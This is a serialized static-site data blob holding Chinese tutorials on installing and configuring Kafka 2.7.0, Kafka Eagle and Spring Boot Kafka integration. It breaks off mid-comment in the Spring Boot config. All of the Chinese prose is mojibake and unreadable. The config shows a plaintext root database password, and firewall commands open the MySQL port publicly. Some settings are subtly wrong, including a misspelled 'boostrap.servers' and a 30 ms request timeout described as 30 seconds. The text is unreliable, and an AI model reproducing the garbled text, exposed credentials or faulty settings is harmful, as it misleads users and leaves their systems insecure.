æ­å»ºååæ°è§£æ",date:"2023-06-25T09:22:36.000Z",permalink:"/kafka/1401",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/01.kafka/1401.Kafka-2.7.0%20%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%8F%82%E6%95%B0%E8%A7%A3%E6%9E%90.html",relativePath:"02.ä¸­é´ä»¶/01.kafka/1401.Kafka-2.7.0 æ­å»ºååæ°è§£æ.md",key:"v-38452f23",path:"/kafka/1401/",headers:[{level:2,title:"æ­å»º",slug:"æ­å»º",normalizedTitle:"æ­å»º",charIndex:2},{level:3,title:"æä»¶ä»ç»",slug:"æä»¶ä»ç»",normalizedTitle:"æä»¶ä»ç»",charIndex:218},{level:3,title:"åºç¡å½ä»¤",slug:"åºç¡å½ä»¤",normalizedTitle:"åºç¡å½ä»¤",charIndex:562},{level:3,title:"å¯å¨",slug:"å¯å¨",normalizedTitle:"å¯å¨",charIndex:368},{level:2,title:"kafka web UI",slug:"kafka-web-ui",normalizedTitle:"kafka web ui",charIndex:1953},{level:2,title:"åæ°è§£æ",slug:"åæ°è§£æ",normalizedTitle:"åæ°è§£æ",charIndex:4967},{level:2,title:"é¿éäºä¸­é¨ç½²æ³¨æäºé¡¹",slug:"é¿éäºä¸­é¨ç½²æ³¨æäºé¡¹",normalizedTitle:"é¿éäºä¸­é¨ç½²æ³¨æäºé¡¹",charIndex:6041}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"æ­å»º æä»¶ä»ç» åºç¡å½ä»¤ å¯å¨ kafka web UI åæ°è§£æ é¿éäºä¸­é¨ç½²æ³¨æäºé¡¹",content:"# æ­å»º\n\nwget https://mirrors.tuna.tsinghua.edu.cn/apache/kafka/2.7.0/kafka_2.13-2.7.0.tgz\n\ntar -xzf kafka_2.13-2.7.0.tgz\ncd kafka_2.13-2.7.0\n\n\n1\n2\n3\n4\n\n\n> ä¸è½½ç kafka èªå¸¦æ ZooKeeperï¼ä½å¾å¿«ï¼ZooKeeper å°ä¸åè¢« Apache Kafka æéè¦ã\n\n\n# æä»¶ä»ç»\n\nkafka å®è£å¥½ä»¥ååå«æä»¥ä¸æä»¶\n\n[root@localhost kafka_2.13-2.7.0]# ls\nbin  config  libs  LICENSE  NOTICE  site-docs\n\n\n1\n2\n\n * bin åå« kafka ç topic èæ¬ãkafka å¯å¨èæ¬ãZooKeeper å¯å¨èæ¬ãçäº§èèæ¬ãæ¶è´¹èèæ¬ç­\n * config åå«çäº§èéç½®ãæ¶è´¹èéç½®ãZooKeeper éç½®ãkafka éç½®ä»¥åä¸äº connect éç½®\n * libs ä¸»è¦æ¯ä¸äº jar æä»¶\n\n> åºç¨ç¨åºä¸è¬åä¸ºçäº§èåæ¶è´¹èï¼å¯¹äº kafka æå¡éç½®åªéè¦å³å¿ ZooKeeper å kafka æ¬èº«éç½®å³å¯ï¼å¶ä½å¨åºç¨æ¬èº«å¯ä»¥æ§å¶\n\n\n# åºç¡å½ä»¤\n\nåå»º topicï¼--replication-factor å¯æ¬æ°é ï¼--partitions ååºæ°éï¼å¯æ¬æ°éæå¥½å°äºéç¾¤æ°é\n\n./kafka-topics.sh --create --zookeeper ip:2181  --replication-factor 1 --partitions 1 --topic topic_name\n\n\n1\n\n\nå é¤ topic\n\n./kafka-topics.sh --delete --zookeeper ip:2181 --topic topic_name\n\n\n1\n\n\næ¥çææç topic\n\n./kafka-topics.sh --list --zookeeper ip:2181 \n\n\n1\n\n\næ¥çæä¸ä¸ª topic çè¯¦æ\n\n./kafka-topics.sh --zookeeper ip:2181 --describe --topic topic_name\n\n\n1\n\n\nå¯å¨ producer\n\n./kafka-console-producer.sh --broker-list ip:9092  --topic topic_name\n\n\n1\n\n\nå¯å¨ consumerï¼--from-beginning ä»å¤´å¼å§æ¶è´¹ï¼æ²¡æä¹åçäº§çæ°æ®ä¼ä¸¢å¼\n\n./kafka-console-consumer.sh --bootstrap-server ip:9092  --topic topic_name --from-beginning\n\n\n1\n\n\n\n# å¯å¨\n\nå¯å¨ zookeeper\n\n# åä¿®æ¹éç½®\nvim /config/zookeeper.properties\n\nzookeeper.connect=192.168.81.62:2181\nclientPortAddress=192.168.81.62\n# å¯å¨\nbin/zookeeper-server-start.sh -daemon config/zookeeper.properties\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\néç½® kafkaï¼å¹¶å¯å¨ï¼å¦ææ¯éç¾¤æ¨¡å¼çè¯ï¼åªéè¦æ¹ broker.id å³å¯\n\n# åä¿®æ¹éç½®\nvim /config/server.properties\n\n# éç¾¤æ¨¡å¼ä¸broker.id å¿é¡»å¯ä¸\nbroker.id=0\n# æ¶æ¯çå­å¨ä½ç½®(æä¹åä½ç½®)\nlog.dirs=/tmp/kafka-logs\n# éç½®kafkaåè®¸è¢«è¿æ¥çipåç«¯å£\nlisteners=PLAINTEXT://192.168.81.62:9092\n# zookeeperè¿æ¥ å¤å°zookeeper ',' éå·åå²\nzookeeper.connect=192.168.81.62:2181\n# å¯å¨\nbin/kafka-server-start.sh -daemon config/server.properties\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\næåå¯å¨æææå¡åï¼æ¨å°è¿è¡å¹¶å¯ä»¥ä½¿ç¨åºæ¬ç Kafka ç¯å¢ã\n\n> åå³é­ kafka åå³é­ zookeeperï¼è¥åå³é­äº zookeeper å¯¼è´ kafka æ æ³å³é­ï¼å¯ä»¥åå¯å¨ zookeeper åå³é­ kafkaã\n\n\n# kafka web UI\n\nå®æ¹ææ¡£ï¼æä¸è½½å°äº window æ¬æºï¼å¹¶æ²¡æå¨ linux ä¸æä½ï¼é¦åè¯¥ UI è¦æ±æ java8 çç¯å¢éç½®ä¸­ï¼ç¶åæä¸è½½è§£åçæä»¶ä¹éç½®å°ç¯å¢åéä¸­ï¼å¦åä¼å¯å¨æ¥éï¼èä¸åéå¿é¡»å« KE_HOMEã\n\n\n\nç¶åä¿®æ¹ D:\\tools\\kafka-eagle-web-2.0.4\\conf\\system-config.propertiesï¼å¤å¶ä»¥ä¸éç½®å°ä½ çæä»¶ä¸­å°±å¥½äºï¼å¾å¤çéç½®ä½¿ç¨ä¸å°çï¼åªéè¦ä¿®æ¹ æ°æ®åºè¿æ¥ å cluster1.zk.list å°åå°±å¥½\n\n######################################\n# multi zookeeper & kafka cluster list\n######################################\nkafka.eagle.zk.cluster.alias=cluster1\ncluster1.zk.list=192.168.81.62:2181\n\n######################################\n# zookeeper enable acl\n######################################\ncluster1.zk.acl.enable=false\n\n######################################\n# broker size online list\n######################################\ncluster1.kafka.eagle.broker.size=20\n\n######################################\n# zk client thread limit\n######################################\nkafka.zk.limit.size=32\n\n######################################\n# kafka eagle webui port\n######################################\nkafka.eagle.webui.port=8048\n\n######################################\n# kafka jmx acl and ssl authenticate\n######################################\ncluster1.kafka.eagle.jmx.acl=false\n\n######################################\n# kafka offset storage\n######################################\ncluster1.kafka.eagle.offset.storage=kafka\n#cluster2.kafka.eagle.offset.storage=zk\n\n######################################\n# kafka jmx uri\n######################################\n#cluster1.kafka.eagle.jmx.uri=service:jmx:rmi:///jndi/rmi://%s/jmxrmi\n\n######################################\n# kafka metrics, 15 days by default\n######################################\nkafka.eagle.metrics.charts=true\nkafka.eagle.metrics.retain=15\n\n######################################\n# kafka sql topic records max\n######################################\nkafka.eagle.sql.topic.records.max=5000\n\n######################################\n# delete kafka topic token\n######################################\nkafka.eagle.topic.token=keadmin\n\n######################################\n# kafka mysql jdbc driver address\n######################################\nkafka.eagle.driver=com.mysql.cj.jdbc.Driver\nkafka.eagle.url=jdbc:mysql://192.168.81.61:3306/ke?useUnicode=true&characterEncoding=UTF-8&zeroDateTimeBehavior=convertToNull\nkafka.eagle.username=root\nkafka.eagle.password=Admin@123\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n\n\nå¯å¨ D:\\tools\\kafka-eagle-web-2.0.4\\bin\\ke.bat\n\nçå° tomcat æå°ï¼éè¦å¤ç­å¾ä¸äºæ¶é´ï¼å¦æç­å¾å¤ªä¹å¯ä»¥åå³é­ kafka æå¡ã\n\n2021-02-20 16:44:06 INFO  [ZooKeeper.Thread-236] - Initiating client connection, connectString=192.168.81.62:2181 sessionTimeout=30000 watcher=kafka.zookeeper.ZooKeeperClient$ZooKeeperClientWatcher$@7bac5016\n2021-02-20 16:44:06 INFO  [ZooKeeperClient.Thread-236] - [ZooKeeperClient] Waiting until connected.\n\n\n1\n2\n\n\n\n\n> å¸¸è§ç web uiï¼å®è£æ¹å¼ï¼https://cloud.tencent.com/developer/article/1667262 ä¸è½½å°åï¼https://github.com/wolfogre/kafka-manager-docker/releases\n\n\n# åæ°è§£æ\n\næ¯ä¸ª broker çå¯ä¸éè´æ´æ° id çæ è¯ã\n\nbroker.id=0\n\n\n1\n\n\nkafka å­æ¾æ°æ®çè·¯å¾ï¼è·¯å¾å¹¶ä¸æ¯åªå¯ä»¥åä¸ä¸ªï¼å¯ä»¥åå¤ä¸ªç¨éå·åå²ï¼\n\nlog.dirs=/tmp/kafka-logs\n\n\n1\n\n\nzookeeper çè¿æ¥\n\nzookeeper.connect=host:port,host:port\n\n\n1\n\n\ntopic çé»è®¤ååºæ°éï¼ä¸è¬æ¶è´¹èçæ°éå°½éåååºæ°ä¿æä¸è´ 1:1ï¼å¦åä¼é æå¤ä¸ª æ¶è´¹èæ¶è´¹ä¸ä¸ªååºï¼æèååºè¿å¤§ï¼æ¶è´¹èæ¶è´¹ä¸å³æ¶ (1 æ¡ 1 æ¡æ¶è´¹)\n\nnum.partitions=1\n\n\n1\n\n\ntopic ååºéæ¯ä¸ª log æä»¶çæå¤§å¼\n\nlog.segment.bytes=1024*1024*1024\n\n\n1\n\n\nå³ä½¿ä»¥ä¸åæ°æ²¡æè¾¾å°æä»¶çæå¤§å¼ï¼å½åå»ºæ¶é´è¾¾ï¼24*7 = ä¸å¨ï¼å°æ­¤å±æ§å¼ï¼å°±ä¼åå»ºæä»¶ã\n\nlog.roll.hours=24*7\n\n\n1\n\n\næ¯ä¸ª log index çæå¤§å°ºå¯¸ãå¦æ log index å°ºå¯¸è¾¾å°è¿ä¸ªæ°å¼ï¼å³ä½¿å°ºå¯¸æ²¡æè¶è¿ log.segment.bytes éå¶ï¼ä¹éè¦äº§çæ°å¾ log index\n\nlog.index.size.max.bytes\n\n\n1\n\n\nå¦æä¸ä¸ª follower å¨è¿ä¸ªæ¶é´åæ²¡æåé fetch è¯·æ±ï¼leader å°ä» ISR ä¸­ç§»é¤è¿ä¸ª follower\n\nreplica.lag.time.max.ms=10000\n\n\n1\n\n\nå¤ä»½æ¶æ¯æ¬¡ fetch çæå¤§å¼\n\nreplica.lag.fetch.max.bytes=1024*1024\n\n\n1\n\n\nææäºæ¯å¦è½å¤ä½¿ä¸å¨ ISR ä¸­ replicas è®¾ç½®ç¨æ¥åä¸º leader\n\nunclean.leader.election.enable=true\n\n\n1\n\n\næ¯å¦è½å¤å é¤ topic\n\ndelete.topic.enable=false\n\n\n1\n\n\nçäº§èè®¾ç½® kafka éç¾¤\n\nboostrap.servers=host:port,host:port\n\n\n1\n\n\nçäº§è ack æ¶æ¯ç¡®å®æºå¶\n\nacks=1\n\n\n1\n\n\nçäº§èæ¹éåéæ¶æ¯ (ä»¥ 16384 å­èæ°ä¸ºä¸æ¹)ï¼æ­¤åæ°è°æ´é¡»æ¯ 1024 æ´æ°å\n\nbatch.size=16384\n\n\n1\n\n\nçäº§èåéæ¶æ¯çé´éï¼0 ä»£è¡¨ææ°æ®ç«é©¬åéï¼å¦æè¦ä½¿ç¨æ¹å¤çï¼è¯¥å¼å»ºè®®è°å¨ 1s ä»¥åï¼æ ¹æ®å®éæ°æ®éçå¤§å°è®¡ç®ã\n\nlinger.ms=0\n\n\n1\n\n\n\n# é¿éäºä¸­é¨ç½²æ³¨æäºé¡¹\n\né¿éäºä¸­çç«¯å£å¼æ¾éè¦å¦ä¸æ¹å¼ï¼ä½¿ç¨ iptables æ ¹æ¬æ æ\n\nfirewall-cmd --zone=public --add-port=2181/tcp --permanent\nfirewall-cmd --zone=public --add-port=9092/tcp --permanent\nfirewall-cmd --zone=public --add-port=3306/tcp --permanent\n\n\n1\n2\n3\n\n\néç½® IP éè¦æ³¨æï¼zookeeper å¯ä»¥ç´æ¥èµ°åç½ï¼å å° zookeeper é¾æ¥è¶æ¶æ¶é´\n",normalizedContent:"# æ­å»º\n\nwget https://mirrors.tuna.tsinghua.edu.cn/apache/kafka/2.7.0/kafka_2.13-2.7.0.tgz\n\ntar -xzf kafka_2.13-2.7.0.tgz\ncd kafka_2.13-2.7.0\n\n\n1\n2\n3\n4\n\n\n> ä¸è½½ç kafka èªå¸¦æ zookeeperï¼ä½å¾å¿«ï¼zookeeper å°ä¸åè¢« apache kafka æéè¦ã\n\n\n# æä»¶ä»ç»\n\nkafka å®è£å¥½ä»¥ååå«æä»¥ä¸æä»¶\n\n[root@localhost kafka_2.13-2.7.0]# ls\nbin  config  libs  license  notice  site-docs\n\n\n1\n2\n\n * bin åå« kafka ç topic èæ¬ãkafka å¯å¨èæ¬ãzookeeper å¯å¨èæ¬ãçäº§èèæ¬ãæ¶è´¹èèæ¬ç­\n * config åå«çäº§èéç½®ãæ¶è´¹èéç½®ãzookeeper éç½®ãkafka éç½®ä»¥åä¸äº connect éç½®\n * libs ä¸»è¦æ¯ä¸äº jar æä»¶\n\n> åºç¨ç¨åºä¸è¬åä¸ºçäº§èåæ¶è´¹èï¼å¯¹äº kafka æå¡éç½®åªéè¦å³å¿ zookeeper å kafka æ¬èº«éç½®å³å¯ï¼å¶ä½å¨åºç¨æ¬èº«å¯ä»¥æ§å¶\n\n\n# åºç¡å½ä»¤\n\nåå»º topicï¼--replication-factor å¯æ¬æ°é ï¼--partitions ååºæ°éï¼å¯æ¬æ°éæå¥½å°äºéç¾¤æ°é\n\n./kafka-topics.sh --create --zookeeper ip:2181  --replication-factor 1 --partitions 1 --topic topic_name\n\n\n1\n\n\nå é¤ topic\n\n./kafka-topics.sh --delete --zookeeper ip:2181 --topic topic_name\n\n\n1\n\n\næ¥çææç topic\n\n./kafka-topics.sh --list --zookeeper ip:2181 \n\n\n1\n\n\næ¥çæä¸ä¸ª topic çè¯¦æ\n\n./kafka-topics.sh --zookeeper ip:2181 --describe --topic topic_name\n\n\n1\n\n\nå¯å¨ producer\n\n./kafka-console-producer.sh --broker-list ip:9092  --topic topic_name\n\n\n1\n\n\nå¯å¨ consumerï¼--from-beginning ä»å¤´å¼å§æ¶è´¹ï¼æ²¡æä¹åçäº§çæ°æ®ä¼ä¸¢å¼\n\n./kafka-console-consumer.sh --bootstrap-server ip:9092  --topic topic_name --from-beginning\n\n\n1\n\n\n\n# å¯å¨\n\nå¯å¨ zookeeper\n\n# åä¿®æ¹éç½®\nvim /config/zookeeper.properties\n\nzookeeper.connect=192.168.81.62:2181\nclientportaddress=192.168.81.62\n# å¯å¨\nbin/zookeeper-server-start.sh -daemon config/zookeeper.properties\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\néç½® kafkaï¼å¹¶å¯å¨ï¼å¦ææ¯éç¾¤æ¨¡å¼çè¯ï¼åªéè¦æ¹ broker.id å³å¯\n\n# åä¿®æ¹éç½®\nvim /config/server.properties\n\n# éç¾¤æ¨¡å¼ä¸broker.id å¿é¡»å¯ä¸\nbroker.id=0\n# æ¶æ¯çå­å¨ä½ç½®(æä¹åä½ç½®)\nlog.dirs=/tmp/kafka-logs\n# éç½®kafkaåè®¸è¢«è¿æ¥çipåç«¯å£\nlisteners=plaintext://192.168.81.62:9092\n# zookeeperè¿æ¥ å¤å°zookeeper ',' éå·åå²\nzookeeper.connect=192.168.81.62:2181\n# å¯å¨\nbin/kafka-server-start.sh -daemon config/server.properties\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\næåå¯å¨æææå¡åï¼æ¨å°è¿è¡å¹¶å¯ä»¥ä½¿ç¨åºæ¬ç kafka ç¯å¢ã\n\n> åå³é­ kafka åå³é­ zookeeperï¼è¥åå³é­äº zookeeper å¯¼è´ kafka æ æ³å³é­ï¼å¯ä»¥åå¯å¨ zookeeper åå³é­ kafkaã\n\n\n# kafka web ui\n\nå®æ¹ææ¡£ï¼æä¸è½½å°äº window æ¬æºï¼å¹¶æ²¡æå¨ linux ä¸æä½ï¼é¦åè¯¥ ui è¦æ±æ java8 çç¯å¢éç½®ä¸­ï¼ç¶åæä¸è½½è§£åçæä»¶ä¹éç½®å°ç¯å¢åéä¸­ï¼å¦åä¼å¯å¨æ¥éï¼èä¸åéå¿é¡»å« ke_homeã\n\n\n\nç¶åä¿®æ¹ d:\\tools\\kafka-eagle-web-2.0.4\\conf\\system-config.propertiesï¼å¤å¶ä»¥ä¸éç½®å°ä½ çæä»¶ä¸­å°±å¥½äºï¼å¾å¤çéç½®ä½¿ç¨ä¸å°çï¼åªéè¦ä¿®æ¹ æ°æ®åºè¿æ¥ å cluster1.zk.list å°åå°±å¥½\n\n######################################\n# multi zookeeper & kafka cluster list\n######################################\nkafka.eagle.zk.cluster.alias=cluster1\ncluster1.zk.list=192.168.81.62:2181\n\n######################################\n# zookeeper enable acl\n######################################\ncluster1.zk.acl.enable=false\n\n######################################\n# broker size online list\n######################################\ncluster1.kafka.eagle.broker.size=20\n\n######################################\n# zk client thread limit\n######################################\nkafka.zk.limit.size=32\n\n######################################\n# kafka eagle webui port\n######################################\nkafka.eagle.webui.port=8048\n\n######################################\n# kafka jmx acl and ssl authenticate\n######################################\ncluster1.kafka.eagle.jmx.acl=false\n\n######################################\n# kafka offset storage\n######################################\ncluster1.kafka.eagle.offset.storage=kafka\n#cluster2.kafka.eagle.offset.storage=zk\n\n######################################\n# kafka jmx uri\n######################################\n#cluster1.kafka.eagle.jmx.uri=service:jmx:rmi:///jndi/rmi://%s/jmxrmi\n\n######################################\n# kafka metrics, 15 days by default\n######################################\nkafka.eagle.metrics.charts=true\nkafka.eagle.metrics.retain=15\n\n######################################\n# kafka sql topic records max\n######################################\nkafka.eagle.sql.topic.records.max=5000\n\n######################################\n# delete kafka topic token\n######################################\nkafka.eagle.topic.token=keadmin\n\n######################################\n# kafka mysql jdbc driver address\n######################################\nkafka.eagle.driver=com.mysql.cj.jdbc.driver\nkafka.eagle.url=jdbc:mysql://192.168.81.61:3306/ke?useunicode=true&characterencoding=utf-8&zerodatetimebehavior=converttonull\nkafka.eagle.username=root\nkafka.eagle.password=admin@123\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n\n\nå¯å¨ d:\\tools\\kafka-eagle-web-2.0.4\\bin\\ke.bat\n\nçå° tomcat æå°ï¼éè¦å¤ç­å¾ä¸äºæ¶é´ï¼å¦æç­å¾å¤ªä¹å¯ä»¥åå³é­ kafka æå¡ã\n\n2021-02-20 16:44:06 info  [zookeeper.thread-236] - initiating client connection, connectstring=192.168.81.62:2181 sessiontimeout=30000 watcher=kafka.zookeeper.zookeeperclient$zookeeperclientwatcher$@7bac5016\n2021-02-20 16:44:06 info  [zookeeperclient.thread-236] - [zookeeperclient] waiting until connected.\n\n\n1\n2\n\n\n\n\n> å¸¸è§ç web uiï¼å®è£æ¹å¼ï¼https://cloud.tencent.com/developer/article/1667262 ä¸è½½å°åï¼https://github.com/wolfogre/kafka-manager-docker/releases\n\n\n# åæ°è§£æ\n\næ¯ä¸ª broker çå¯ä¸éè´æ´æ° id çæ è¯ã\n\nbroker.id=0\n\n\n1\n\n\nkafka å­æ¾æ°æ®çè·¯å¾ï¼è·¯å¾å¹¶ä¸æ¯åªå¯ä»¥åä¸ä¸ªï¼å¯ä»¥åå¤ä¸ªç¨éå·åå²ï¼\n\nlog.dirs=/tmp/kafka-logs\n\n\n1\n\n\nzookeeper çè¿æ¥\n\nzookeeper.connect=host:port,host:port\n\n\n1\n\n\ntopic çé»è®¤ååºæ°éï¼ä¸è¬æ¶è´¹èçæ°éå°½éåååºæ°ä¿æä¸è´ 1:1ï¼å¦åä¼é æå¤ä¸ª æ¶è´¹èæ¶è´¹ä¸ä¸ªååºï¼æèååºè¿å¤§ï¼æ¶è´¹èæ¶è´¹ä¸å³æ¶ (1 æ¡ 1 æ¡æ¶è´¹)\n\nnum.partitions=1\n\n\n1\n\n\ntopic ååºéæ¯ä¸ª log æä»¶çæå¤§å¼\n\nlog.segment.bytes=1024*1024*1024\n\n\n1\n\n\nå³ä½¿ä»¥ä¸åæ°æ²¡æè¾¾å°æä»¶çæå¤§å¼ï¼å½åå»ºæ¶é´è¾¾ï¼24*7 = ä¸å¨ï¼å°æ­¤å±æ§å¼ï¼å°±ä¼åå»ºæä»¶ã\n\nlog.roll.hours=24*7\n\n\n1\n\n\næ¯ä¸ª log index çæå¤§å°ºå¯¸ãå¦æ log index å°ºå¯¸è¾¾å°è¿ä¸ªæ°å¼ï¼å³ä½¿å°ºå¯¸æ²¡æè¶è¿ log.segment.bytes éå¶ï¼ä¹éè¦äº§çæ°å¾ log index\n\nlog.index.size.max.bytes\n\n\n1\n\n\nå¦æä¸ä¸ª follower å¨è¿ä¸ªæ¶é´åæ²¡æåé fetch è¯·æ±ï¼leader å°ä» isr ä¸­ç§»é¤è¿ä¸ª follower\n\nreplica.lag.time.max.ms=10000\n\n\n1\n\n\nå¤ä»½æ¶æ¯æ¬¡ fetch çæå¤§å¼\n\nreplica.lag.fetch.max.bytes=1024*1024\n\n\n1\n\n\nææäºæ¯å¦è½å¤ä½¿ä¸å¨ isr ä¸­ replicas è®¾ç½®ç¨æ¥åä¸º leader\n\nunclean.leader.election.enable=true\n\n\n1\n\n\næ¯å¦è½å¤å é¤ topic\n\ndelete.topic.enable=false\n\n\n1\n\n\nçäº§èè®¾ç½® kafka éç¾¤\n\nboostrap.servers=host:port,host:port\n\n\n1\n\n\nçäº§è ack æ¶æ¯ç¡®å®æºå¶\n\nacks=1\n\n\n1\n\n\nçäº§èæ¹éåéæ¶æ¯ (ä»¥ 16384 å­èæ°ä¸ºä¸æ¹)ï¼æ­¤åæ°è°æ´é¡»æ¯ 1024 æ´æ°å\n\nbatch.size=16384\n\n\n1\n\n\nçäº§èåéæ¶æ¯çé´éï¼0 ä»£è¡¨ææ°æ®ç«é©¬åéï¼å¦æè¦ä½¿ç¨æ¹å¤çï¼è¯¥å¼å»ºè®®è°å¨ 1s ä»¥åï¼æ ¹æ®å®éæ°æ®éçå¤§å°è®¡ç®ã\n\nlinger.ms=0\n\n\n1\n\n\n\n# é¿éäºä¸­é¨ç½²æ³¨æäºé¡¹\n\né¿éäºä¸­çç«¯å£å¼æ¾éè¦å¦ä¸æ¹å¼ï¼ä½¿ç¨ iptables æ ¹æ¬æ æ\n\nfirewall-cmd --zone=public --add-port=2181/tcp --permanent\nfirewall-cmd --zone=public --add-port=9092/tcp --permanent\nfirewall-cmd --zone=public --add-port=3306/tcp --permanent\n\n\n1\n2\n3\n\n\néç½® ip éè¦æ³¨æï¼zookeeper å¯ä»¥ç´æ¥èµ°åç½ï¼å å° zookeeper é¾æ¥è¶æ¶æ¶é´\n",charsets:{cjk:!0}},{title:"kafka-2.7.0 spring boot éæ kafka",frontmatter:{title:"kafka-2.7.0 spring boot éæ kafka",date:"2023-06-25T09:22:36.000Z",permalink:"/kafka/1402",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/01.kafka/1402.kafka-2.7.0%20spring%20boot%20%E9%9B%86%E6%88%90%20kafka.html",relativePath:"02.ä¸­é´ä»¶/01.kafka/1402.kafka-2.7.0 spring boot éæ kafka.md",key:"v-2674598f",path:"/kafka/1402/",headers:[{level:2,title:"ä¾èµ",slug:"ä¾èµ",normalizedTitle:"ä¾èµ",charIndex:2},{level:2,title:"éç½®",slug:"éç½®",normalizedTitle:"éç½®",charIndex:367},{level:2,title:"çäº§ä¸æ¶è´¹",slug:"çäº§ä¸æ¶è´¹",normalizedTitle:"çäº§ä¸æ¶è´¹",charIndex:5093},{level:2,title:"æ¹éæ¶è´¹",slug:"æ¹éæ¶è´¹",normalizedTitle:"æ¹éæ¶è´¹",charIndex:4062}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"ä¾èµ éç½® çäº§ä¸æ¶è´¹ æ¹éæ¶è´¹",content:'# ä¾èµ\n\n<dependencies>\n    \x3c!-- 2.3.7 --\x3e\n    <dependency>\n        <groupId>org.springframework.kafka</groupId>\n        <artifactId>spring-kafka</artifactId>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-autoconfigure</artifactId>\n    </dependency>\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# éç½®\n\nspring:\n  kafka:\n    ###########ãkafkaéç¾¤ã###########\n    # 192.168.81.62:9092,192.168.81.62:9092\n    bootstrap-servers: 47.101.179.240:9092\n    ###########ãåå§åçäº§èéç½®ã###########\n    producer:\n      # éè¯æ¬¡æ°ï¼producer ä¸¤æ¬¡éè¯ä¹é´ä¼åé¡¿ä¸æ®µæ¶é´ï¼ä»¥é²æ­¢é¢ç¹å°éè¯å¯¹ç³»ç»å¸¦æ¥å²å»ãè¿æ®µæ¶é´æ¯å¯ä»¥éç½®çï¼ç±åæ° retry.backoff.ms æå®ï¼é»è®¤æ¯ 100 æ¯«ç§\n      # éè¯å¯è½é ææ¶æ¯çéå¤åé,ä¸ºäºåºå¯¹è¿ä¸é£é©ï¼ Kafka è¦æ±ç¨æ·å¨ consumer ç«¯å¿é¡»æ§è¡å»éå¤ç\n      # éè¯å¯è½é ææ¶æ¯çä¹±åºï¼producer æä¾äº max.in.flight.requets.per.connectionåæ° ä¸æ¦ç¨æ·å°æ­¤åæ°è®¾ç½®æ 1, producer å°ç¡®ä¿æä¸æ¶å»åªè½åéä¸ä¸ªè¯·æ±\n      retries: 2\n      # acks=0 ï¼ producer ä¸ç­kafkaæ¯å¦æ¥æ¶æåï¼ç«å³å¼å§å¶ä»å·¥ä½ -> æé«ååéï¼åä¼ä¸¢å¤±æ°æ®\n      # acks=1 ï¼ producer åéæ¶æ¯å leader broker ä»å°è¯¥æ¶æ¯åå¥æ¬å°æ¥å¿ï¼ç¶åä¾¿åéååºç»æ producer ï¼èæ é¡»ç­å¾ ISR ä¸­å¶ä»å¯æ¬åå¥è¯¥æ¶æ¯ãè½ä¿è¯ååéï¼ä¹è½ä¿è¯ä¸å®çæä¹æ§ã\n      # acks=all/-1 ï¼è¡¨ç¤ºå½åéæ¶æ¯æ¶ï¼ leader broker ä¸ä»ä¼å°æ¶æ¯åå¥æ¬å°æ¥å¿ï¼åæ¶è¿ä¼ç­å¾ ISR ä¸­ææå¶ä»å¯æ¬é½æååå¥å®ä»¬åèªçæ¬å°æ¥å¿åï¼æåéååºç»æç»producerãååéæä½ï¼ä½ä¸ä¼ä¸¢å¤±æ°æ®ã\n      acks: 1\n      # åæ°é»è®¤å¼æ¯ 16384B=16KBãproducer ä¼å°åå¾åä¸ååºçå¤æ¡æ¶æ¯å°è£è¿ä¸ä¸ª batch ä¸­ãå½ batch æ»¡äºçæ¶åï¼ producer ä¼åé batch\n      # ä¸­çæææ¶æ¯ãä¸è¿ï¼ producer å¹¶ä¸æ»æ¯ batch æ»¡äºæåéæ¶æ¯ï¼å¾æå¯è½å½ batch è¿æå¾å¤ç©ºé²ç©ºé´æ¶ producer å°±åéè¯¥ batchï¼\n      # producer ä¸ç®¡æ¯å¦è½å¤å¡«æ»¡ï¼ producer é½ä¼ä¸ºè¯¥ batch åéåºå®å¤§å°çåå­ã\n      batch-size: 131072\n      properties:\n        # æ§å¶æ¶æ¯åéå»¶æ¶è¡ä¸º,è¿ä¸ªåæ°ä¹å°±æ¯å½±å batch ä¸æ»¡ä¹ä¼è¢«åéçåå ï¼å®éä¸è¿ä¹æ¯ä¸ç§æè¡¡ï¼å³ååéä¸å»¶æ¶ä¹é´çæè¡¡\n        linger.ms: 200\n        # produce åéè¯·æ±ç»brokeråï¼brokeréè¦å¨è§å®çæ¶é´èå´åå°å¤ççç»æè¿è¿ç» produceãè¿æ®µæ¶é´ä¾¿æ¯ç±è¯¥åæ°æ§å¶çï¼é»è®¤æ¯ 30sã\n        # é»è®¤ç30så¯¹äºä¸è¬çæåµèè¨æ¯è¶³å¤çï¼ä½å¦æ producer åéçè´è½½å¾å¤§ï¼è¶æ¶çæåµå°±å¾å®¹æç¢°å°ï¼æ­¤æ¶å°±åºè¯¥éå½è°æ´è¯¥åæ°å¼ã\n        request.timeout.ms: 30\n        # æ§å¶ producer åéè¯·æ±çå¤§å°ï¼1048576B=1Mï¼è¯¥è¯·æ±åæ¬æ¶æ¯ä½åè¯·æ±å¤´çæ´ä½å¤§å°\n        max.request.size: 1048576\n        # ä¸ºé²æ­¢ topic åååºä¸çæ¶æ¯ä¹±åºé®é¢ãè¿ä¸ªåæ°çå®éææå